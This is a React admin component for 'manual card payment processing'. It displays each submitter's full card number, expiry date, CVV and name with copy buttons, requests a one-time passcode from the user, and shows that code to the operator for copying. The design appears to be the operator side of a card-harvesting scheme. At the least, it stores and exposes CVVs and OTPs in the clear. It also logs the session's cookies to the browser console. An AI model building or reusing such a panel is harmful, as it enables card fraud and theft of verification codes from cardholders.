import React, { useState, useEffect } from 'react';
import {
  CreditCard,
  Eye,
  EyeOff,
  CheckCircle,
  XCircle,
  Clock,
  Copy,
  DollarSign,
  Calendar,
  Hash
} from 'lucide-react';
import {
  getPendingCardPayments,
  updateCardPaymentStatus,
  adminRequestCardPaymentOtp
} from '@/services/paymentService';

interface CardPayment {
  paymentId: string;
  userId: string;
  amount: number;
  currency: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  holderName: string;
  status: 'pending' | 'processing' | 'approved' | 'rejected';
  needsOtp: boolean;
  otpCode?: string;
  createdAt: string;
  updatedAt: string;
}

const AdminCardPayments: React.FC = () => {
  const [cardPayments, setCardPayments] = useState<CardPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [showCardDetails, setShowCardDetails] = useState<{ [key: string]: boolean }>({});
  const [processingId, setProcessingId] = useState<string | null>(null);
  const [hasActivePayments, setHasActivePayments] = useState(false);

  useEffect(() => {
    fetchCardPayments();
  }, []);

  // Separate useEffect for polling based on active payments
  useEffect(() => {
    if (!hasActivePayments) return;

    // Poll more frequently when there are active payments (for real-time OTP updates)
    const interval = setInterval(fetchCardPayments, 5000);
    return () => clearInterval(interval);
  }, [hasActivePayments]);

  // Regular polling every 30 seconds regardless
  useEffect(() => {
    const interval = setInterval(fetchCardPayments, 30000);
    return () => clearInterval(interval);
  }, []); const fetchCardPayments = async () => {
    try {
      setLoading(true);
      console.log('Fetching card payments...');
      console.log('Cookies:', document.cookie);

      const result = await getPendingCardPayments();
      console.log('Card payments result:', result);
      console.log('Full response:', JSON.stringify(result, null, 2));
      if (result.cardPayments) {
        setCardPayments(result.cardPayments);
        console.log('Set payments:', result.cardPayments.length, 'items');

        // Check if there are active payments for frequent polling
        const activePayments = result.cardPayments.some((payment: CardPayment) =>
          payment.status === 'pending' || payment.status === 'processing'
        );
        setHasActivePayments(activePayments);

      } else if (result.success === false) {
        console.warn('API returned error:', result.message);
        setCardPayments([]);
        setHasActivePayments(false);
      } else {
        console.warn('No payments found in result, setting empty array');
        setCardPayments([]);
        setHasActivePayments(false);
      }
    } catch (error: any) {
      console.error('Failed to fetch card payments:', error);
      console.error('Error response:', error.response);
      console.error('Error message:', error.message);
      console.error('Error status:', error.response?.status);
      console.error('Error data:', error.response?.data);
      setCardPayments([]);
      setHasActivePayments(false);
    } finally {
      setLoading(false);
    }
  };

  const toggleCardDetails = (paymentId: string) => {
    setShowCardDetails(prev => ({
      ...prev,
      [paymentId]: !prev[paymentId]
    }));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const handleUpdateStatus = async (paymentId: string, status: 'approved' | 'rejected') => {
    setProcessingId(paymentId);
    try {
      await updateCardPaymentStatus(paymentId, status, `Payment ${status} via manual card processing`);
      fetchCardPayments(); // Refresh the list
      alert(`Payment ${status} successfully`);
    } catch (error: any) {
      console.error('Failed to update payment status:', error);
      alert(error.response?.data?.message || `Failed to ${status} payment`);
    } finally {
      setProcessingId(null);
    }
  };

  const handleRequestOtp = async (paymentId: string) => {
    setProcessingId(paymentId);
    try {
      await adminRequestCardPaymentOtp(paymentId);
      fetchCardPayments(); // Refresh the list to show updated status
      alert('OTP request sent to user successfully');
    } catch (error: any) {
      console.error('Failed to request OTP:', error);
      alert(error.response?.data?.message || 'Failed to request OTP');
    } finally {
      setProcessingId(null);
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'pending': return 'text-yellow-600 bg-yellow-50';
      case 'processing': return 'text-blue-600 bg-blue-50';
      case 'approved': return 'text-green-600 bg-green-50';
      case 'rejected': return 'text-red-600 bg-red-50';
      default: return 'text-gray-600 bg-gray-50';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'pending': return <Clock className="h-4 w-4" />;
      case 'processing': return <Clock className="h-4 w-4" />;
      case 'approved': return <CheckCircle className="h-4 w-4" />;
      case 'rejected': return <XCircle className="h-4 w-4" />;
      default: return <Clock className="h-4 w-4" />;
    }
  };

  if (loading) {
    return (
      <div className="space-y-6">
        <div className="bg-white p-6 rounded-lg border border-gray-200 animate-pulse">
          <div className="h-4 bg-gray-200 rounded w-1/4 mb-4"></div>
          <div className="space-y-3">
            {[...Array(3)].map((_, i) => (
              <div key={i} className="h-4 bg-gray-200 rounded"></div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Card Payments</h1>
          <p className="mt-1 text-sm text-gray-500">
            Manage manual card payment processing ({cardPayments.length} pending)
          </p>
        </div>
        <div className="flex space-x-2">
          <button
            onClick={fetchCardPayments}
            className="inline-flex items-center px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700"
          >
            Refresh
          </button>
          <button
            onClick={() => {
              console.log('Testing API connection...');
              fetch('/admin/payments/card-payments', { credentials: 'include' })
                .then(res => res.json())
                .then(data => console.log('Direct API test result:', data))
                .catch(err => console.error('Direct API test error:', err));
            }}
            className="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
          >
            Test API
          </button>
        </div>
      </div>

      {/* Card Payments List */}
      {loading ? (
        <div className="bg-white rounded-lg border border-gray-200 p-12 text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-500">Loading card payments...</p>
        </div>
      ) : cardPayments.length === 0 ? (
        <div className="bg-white rounded-lg border border-gray-200 p-12 text-center">
          <CreditCard className="h-12 w-12 text-gray-400 mx-auto mb-4" />
          <h3 className="text-lg font-medium text-gray-900 mb-2">No pending card payments</h3>
          <p className="text-gray-500 mb-4">
            All card payments have been processed or no payments have been submitted yet.
          </p>
          <div className="text-xs text-gray-400 space-y-1">
            <p>• Check that card payments have been submitted from the frontend</p>
            <p>• Verify that the server hasn't restarted (payments are stored in memory)</p>
            <p>• Ensure the API endpoint /payments/card/admin/pending is accessible</p>
          </div>
        </div>
      ) : (
        <div className="grid gap-6">
          {cardPayments.map((payment) => (
            <div key={payment.paymentId} className="bg-white rounded-lg border border-gray-200 overflow-hidden">
              <div className="p-6">
                <div className="flex items-start justify-between">
                  <div className="flex items-start space-x-4">
                    <div className="w-12 h-12 bg-blue-50 rounded-lg flex items-center justify-center">
                      <CreditCard className="h-6 w-6 text-blue-600" />
                    </div>
                    <div>
                      <h3 className="text-lg font-medium text-gray-900 mb-1">
                        {payment.holderName}
                      </h3>
                      <div className="flex items-center space-x-4 text-sm text-gray-500">
                        <span className="flex items-center">
                          <Hash className="h-3 w-3 mr-1" />
                          {payment.paymentId}
                        </span>
                        <span className="flex items-center">
                          <Calendar className="h-3 w-3 mr-1" />
                          {new Date(payment.createdAt).toLocaleDateString()}
                        </span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className={`flex items-center space-x-2 px-3 py-1 rounded-full text-sm font-medium ${getStatusColor(payment.status)}`}>
                      {getStatusIcon(payment.status)}
                      <span className="capitalize">{payment.status}</span>
                    </div>
                  </div>
                </div>

                {/* Payment Amount */}
                <div className="mt-4 p-4 bg-gray-50 rounded-lg">
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium text-gray-700">Payment Amount</span>
                    <span className="flex items-center text-2xl font-bold text-gray-900">
                      <DollarSign className="h-5 w-5 mr-1" />
                      {payment.amount.toLocaleString()} {payment.currency}
                    </span>
                  </div>
                </div>

                {/* Card Details Section */}
                <div className="mt-4 border-t pt-4">
                  <div className="flex items-center justify-between mb-3">
                    <h4 className="text-sm font-medium text-gray-700">Card Details</h4>
                    <button
                      onClick={() => toggleCardDetails(payment.paymentId)}
                      className="flex items-center space-x-2 px-3 py-1 text-sm border border-gray-300 rounded-md hover:bg-gray-50"
                    >
                      {showCardDetails[payment.paymentId] ? (
                        <>
                          <EyeOff className="h-4 w-4" />
                          <span>Hide Details</span>
                        </>
                      ) : (
                        <>
                          <Eye className="h-4 w-4" />
                          <span>Show Details</span>
                        </>
                      )}
                    </button>
                  </div>

                  {showCardDetails[payment.paymentId] ? (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-3">
                        <div>
                          <label className="block text-xs font-medium text-gray-500 mb-1">Card Number</label>
                          <div className="flex items-center space-x-2">
                            <code className="flex-1 text-sm bg-gray-100 px-3 py-2 rounded border font-mono">
                              {payment.cardNumber}
                            </code>
                            <button
                              onClick={() => copyToClipboard(payment.cardNumber)}
                              className="p-2 text-gray-400 hover:text-gray-600"
                              title="Copy card number"
                            >
                              <Copy className="h-4 w-4" />
                            </button>
                          </div>
                        </div>

                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <label className="block text-xs font-medium text-gray-500 mb-1">Expiry Month</label>
                            <code className="block text-sm bg-gray-100 px-3 py-2 rounded border font-mono">
                              {payment.expiryMonth}
                            </code>
                          </div>
                          <div>
                            <label className="block text-xs font-medium text-gray-500 mb-1">Expiry Year</label>
                            <code className="block text-sm bg-gray-100 px-3 py-2 rounded border font-mono">
                              {payment.expiryYear}
                            </code>
                          </div>
                        </div>
                      </div>

                      <div className="space-y-3">
                        <div>
                          <label className="block text-xs font-medium text-gray-500 mb-1">CVV</label>
                          <div className="flex items-center space-x-2">
                            <code className="flex-1 text-sm bg-gray-100 px-3 py-2 rounded border font-mono">
                              {payment.cvv}
                            </code>
                            <button
                              onClick={() => copyToClipboard(payment.cvv)}
                              className="p-2 text-gray-400 hover:text-gray-600"
                              title="Copy CVV"
                            >
                              <Copy className="h-4 w-4" />
                            </button>
                          </div>
                        </div>

                        <div>
                          <label className="block text-xs font-medium text-gray-500 mb-1">Cardholder Name</label>
                          <div className="flex items-center space-x-2">
                            <code className="flex-1 text-sm bg-gray-100 px-3 py-2 rounded border font-mono">
                              {payment.holderName}
                            </code>
                            <button
                              onClick={() => copyToClipboard(payment.holderName)}
                              className="p-2 text-gray-400 hover:text-gray-600"
                              title="Copy name"
                            >
                              <Copy className="h-4 w-4" />
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="text-sm text-gray-600">
                      <p>Card ending in {payment.cardNumber.slice(-4)} • {payment.expiryMonth}/{payment.expiryYear}</p>
                    </div>
                  )}
                </div>

                {/* OTP Section */}
                {payment.needsOtp && payment.otpCode && (
                  <div className="mt-4 p-4 bg-blue-50 rounded-lg border border-blue-200">
                    <h4 className="text-sm font-medium text-blue-800 mb-2">OTP Provided by User</h4>
                    <div className="flex items-center space-x-2">
                      <code className="text-lg bg-white px-3 py-2 rounded border font-mono text-blue-900">
                        {payment.otpCode}
                      </code>
                      <button
                        onClick={() => copyToClipboard(payment.otpCode || '')}
                        className="p-2 text-blue-400 hover:text-blue-600"
                        title="Copy OTP"
                      >
                        <Copy className="h-4 w-4" />
                      </button>
                    </div>
                  </div>
                )}

                {/* Action Buttons */}
                {payment.status === 'pending' ? (
                  <div className="mt-6 space-y-3">
                    {/* Request OTP Button */}
                    <button
                      onClick={() => handleRequestOtp(payment.paymentId)}
                      disabled={processingId === payment.paymentId}
                      className="w-full bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed"
                    >
                      {processingId === payment.paymentId ? 'Processing...' : 'Request OTP from User'}
                    </button>

                    <div className="flex space-x-3">
                      <button
                        onClick={() => handleUpdateStatus(payment.paymentId, 'rejected')}
                        disabled={processingId === payment.paymentId}
                        className="flex-1 bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed"
                      >
                        {processingId === payment.paymentId ? 'Processing...' : 'Reject Payment'}
                      </button>
                    </div>
                  </div>
                ) : payment.status === 'processing' ? (
                  <div className="mt-6 flex space-x-3">
                    <button
                      onClick={() => handleUpdateStatus(payment.paymentId, 'approved')}
                      disabled={processingId === payment.paymentId}
                      className="flex-1 bg-green-600 text-white px-4 py-2 rounded-md hover:bg-green-700 disabled:bg-gray-400 disabled:cursor-not-allowed"
                    >
                      {processingId === payment.paymentId ? 'Processing...' : 'Approve Payment'}
                    </button>
                    <button
                      onClick={() => handleUpdateStatus(payment.paymentId, 'rejected')}
                      disabled={processingId === payment.paymentId}
                      className="flex-1 bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed"
                    >
                      {processingId === payment.paymentId ? 'Processing...' : 'Reject Payment'}
                    </button>
                  </div>
                ) : (
                  <div className="mt-6 text-center text-sm text-gray-500">
                    Payment has been {payment.status}
                  </div>
                )}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default AdminCardPayments;
